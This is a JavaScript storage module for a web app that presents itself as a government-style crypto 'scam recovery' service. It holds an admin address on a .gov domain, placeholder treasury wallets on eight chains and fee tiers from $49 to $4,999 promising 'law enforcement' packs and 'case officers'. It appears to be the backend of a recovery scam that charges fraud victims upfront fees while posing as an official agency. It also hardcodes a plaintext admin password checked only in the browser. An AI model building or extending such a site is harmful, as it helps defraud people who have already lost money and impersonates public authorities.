const STORAGE_KEYS = {
  requests: 'lfc-recovery-requests',
  settings: 'lfc-platform-settings',
  adminSession: 'lfc-admin-session',
  cookies: 'lfc-cookies',
  formDraft: 'lfc-recovery-form',
  submission: 'lfc-recovery-submission',
}

export const DEFAULT_SETTINGS = {
  adminEmail: 'admin@libertyforward.gov',
  adminPassword: 'liberty2024',
  wallets: [
    {
      id: 'btc',
      name: 'Bitcoin Treasury Wallet',
      asset: 'BTC',
      network: 'Bitcoin Mainnet',
      address: 'bc1qLFC_TREASURY_BTC_WALLET_ADDRESS',
    },
    {
      id: 'eth',
      name: 'Ethereum Treasury Wallet',
      asset: 'ETH / USDT / USDC',
      network: 'Ethereum ERC-20',
      address: '0xLFC_TREASURY_ETH_WALLET_ADDRESS',
    },
    {
      id: 'bnb',
      name: 'BNB Smart Chain Treasury',
      asset: 'BNB / USDT / USDC',
      network: 'BEP-20',
      address: '0xLFC_TREASURY_BNB_WALLET_ADDRESS',
    },
    {
      id: 'sol',
      name: 'Solana Treasury Wallet',
      asset: 'SOL / USDC',
      network: 'Solana',
      address: 'LFC_TREASURY_SOL_WALLET_ADDRESS',
    },
    {
      id: 'tron',
      name: 'Tron USDT Treasury',
      asset: 'USDT',
      network: 'TRC-20',
      address: 'LFC_TREASURY_TRON_USDT_ADDRESS',
    },
    {
      id: 'xrp',
      name: 'XRP Treasury Wallet',
      asset: 'XRP',
      network: 'XRP Ledger',
      address: 'rLFC_TREASURY_XRP_WALLET_ADDRESS',
    },
    {
      id: 'doge',
      name: 'Dogecoin Treasury Wallet',
      asset: 'DOGE',
      network: 'Dogecoin',
      address: 'DLFC_TREASURY_DOGE_WALLET_ADDRESS',
    },
    {
      id: 'ltc',
      name: 'Litecoin Treasury Wallet',
      asset: 'LTC',
      network: 'Litecoin',
      address: 'ltc1qLFC_TREASURY_LTC_WALLET_ADDRESS',
    },
  ],
  tiers: [
    {
      id: 'tier-1',
      name: 'Citizen Intake Review',
      level: 1,
      fee: 49,
      description: 'Initial scam case review, public transaction assessment, and official reference issuance.',
    },
    {
      id: 'tier-2',
      name: 'Standard Scam Recovery',
      level: 2,
      fee: 149,
      description: 'Full on-chain trace report, scammer wallet mapping, and exchange documentation package.',
    },
    {
      id: 'tier-3',
      name: 'Priority Case Escalation',
      level: 3,
      fee: 349,
      description: 'Expedited review, dedicated case officer, and law enforcement evidence pack.',
    },
    {
      id: 'tier-4',
      name: 'Executive Multi-Agency',
      level: 4,
      fee: 899,
      description: 'Highest priority — cross-border coordination, multi-chain tracing, and agency escalation.',
    },
    {
      id: 'tier-5',
      name: 'High-Value Loss Recovery',
      level: 5,
      fee: 2499,
      description: 'For losses exceeding $50,000 — full forensic package, exchange freeze requests, and sworn affidavit support.',
    },
    {
      id: 'tier-6',
      name: 'Critical Emergency Response',
      level: 6,
      fee: 4999,
      description: '24-hour response for active or recent losses — real-time tracing, immediate documentation, and direct officer contact.',
    },
  ],
}

function readJson(key, fallback) {
  try {
    const raw = window.localStorage.getItem(key)

    if (!raw) {
      return fallback
    }

    return JSON.parse(raw)
  } catch {
    return fallback
  }
}

function writeJson(key, value) {
  window.localStorage.setItem(key, JSON.stringify(value))
}

export function getSettings() {
  const saved = readJson(STORAGE_KEYS.settings, null)

  if (!saved) {
    return { ...DEFAULT_SETTINGS }
  }

  return {
    ...DEFAULT_SETTINGS,
    ...saved,
    wallets: saved.wallets || DEFAULT_SETTINGS.wallets,
    tiers: saved.tiers || DEFAULT_SETTINGS.tiers,
  }
}

export function saveSettings(settings) {
  writeJson(STORAGE_KEYS.settings, settings)
}

export function getRequests() {
  return readJson(STORAGE_KEYS.requests, [])
}

export function saveRequests(requests) {
  writeJson(STORAGE_KEYS.requests, requests)
}

export function addRequest(record) {
  const requests = getRequests()
  const nextRecord = {
    ...record,
    id: crypto.randomUUID(),
    status: 'new',
    paymentStatus: 'pending',
    createdAt: new Date().toISOString(),
  }

  requests.unshift(nextRecord)
  saveRequests(requests)

  return nextRecord
}

export function updateRequest(id, updates) {
  const requests = getRequests()
  const index = requests.findIndex((record) => record.id === id)

  if (index === -1) {
    return null
  }

  requests[index] = { ...requests[index], ...updates }
  saveRequests(requests)

  return requests[index]
}

export function deleteRequest(id) {
  const requests = getRequests()
  const nextRequests = requests.filter((record) => record.id !== id)

  if (nextRequests.length === requests.length) {
    return false
  }

  saveRequests(nextRequests)
  return true
}

export function adminLogin(email, password) {
  const settings = getSettings()

  if (email !== settings.adminEmail || password !== settings.adminPassword) {
    throw new Error('Invalid administrator credentials')
  }

  const session = {
    email,
    loggedInAt: new Date().toISOString(),
  }

  writeJson(STORAGE_KEYS.adminSession, session)
  return session
}

export function getAdminSession() {
  return readJson(STORAGE_KEYS.adminSession, null)
}

export function adminLogout() {
  window.localStorage.removeItem(STORAGE_KEYS.adminSession)
}

export function formatFee(amount) {
  return `$${Number(amount).toLocaleString('en-US')}`
}

export function createReference() {
  return `LFC-${Date.now().toString().slice(-6)}`
}

export { STORAGE_KEYS }
